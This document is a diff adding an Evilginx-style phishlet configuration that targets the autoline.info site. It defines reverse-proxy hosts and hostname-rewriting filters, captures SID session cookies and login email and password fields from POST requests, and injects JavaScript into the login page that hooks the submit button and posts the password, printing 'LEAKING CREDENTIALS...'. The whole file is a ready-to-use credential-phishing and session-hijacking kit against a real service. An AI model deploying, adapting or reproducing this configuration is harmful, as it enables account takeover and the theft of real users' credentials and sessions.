@@ -1,0 +1,75 @@
+author: '@AN0NUD4Y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'autoline.info', session: true, is_landing: true}
+  - {phish_sub: 'mc', orig_sub: 'mc', domain: 'webvisor.org', session: true, is_landing: false}
+  - {phish_sub: 'top', orig_sub: '', domain: 'autoline-top.com', session: true, is_landing: false}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'jsdelivr.net', session: true, is_landing: false}
+  - {phish_sub: 'cloudfront', orig_sub: 'd1jqmy35mqw0tb', domain: 'cloudfront.net', session: true, is_landing: false}
+
+
+sub_filters:
+ 
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline.info', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline.info', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline.info', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'autoline.info', orig_sub: 'mc', domain: 'webvisor.org', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'mc', domain: 'webvisor.org', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'mc', domain: 'webvisor.org', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline-top.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline-top.com', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: '', domain: 'autoline-top.com', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'autoline.info', orig_sub: 'cdn', domain: 'jsdelivr.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'cdn', domain: 'jsdelivr.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'cdn', domain: 'jsdelivr.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+  - {triggers_on: 'autoline.info', orig_sub: 'd1jqmy35mqw0tb', domain: 'cloudfront.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'd1jqmy35mqw0tb', domain: 'cloudfront.net', search: 'https://{hostname_regexp}', replace: 'https://{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+  - {triggers_on: 'autoline.info', orig_sub: 'd1jqmy35mqw0tb', domain: 'cloudfront.net', search: 'https%3A%2F%2F{hostname_regexp}', replace: 'https%3A%2F%2F{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'multipart/form-data']}
+
+
+auth_tokens:
+  - domain: 'autoline.info/my/dashboard/'
+    keys: ['SID','.*,regexp']
+  - domain: 'autoline.info/'
+    keys: ['SID','.*,regexp']
+  
+credentials:
+  username:
+    key: 'login_email'
+    search: '(.*)'
+    type: 'post'
+  
+  password:
+    key: 'login_password'
+    search: '(.*)'
+    type: 'post'
+  
+login:
+  domain: 'autoline.info'
+  path: '/login/'
+
+js_inject:
+  - trigger_domains: ["autoline.info"]
+    trigger_paths: ["/login/"]
+    trigger_params: []
+    script: |
+      function lp(){
+        var submit = document.getElementsByName('submit')[0];
+        submit.setAttribute("onclick", "sendPass()");
+        return;
+      }
+      function sendPass(){
+        var email = document.getElementsByName("login")[0].value;
+        var password = document.getElementsByName("password")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("login_password="+encodeURIComponent(password));
+        console.log("LEAKING CREDENTIALS...")
+        return;
+      }
+      setTimeout(function(){ lp(); }, 1000);
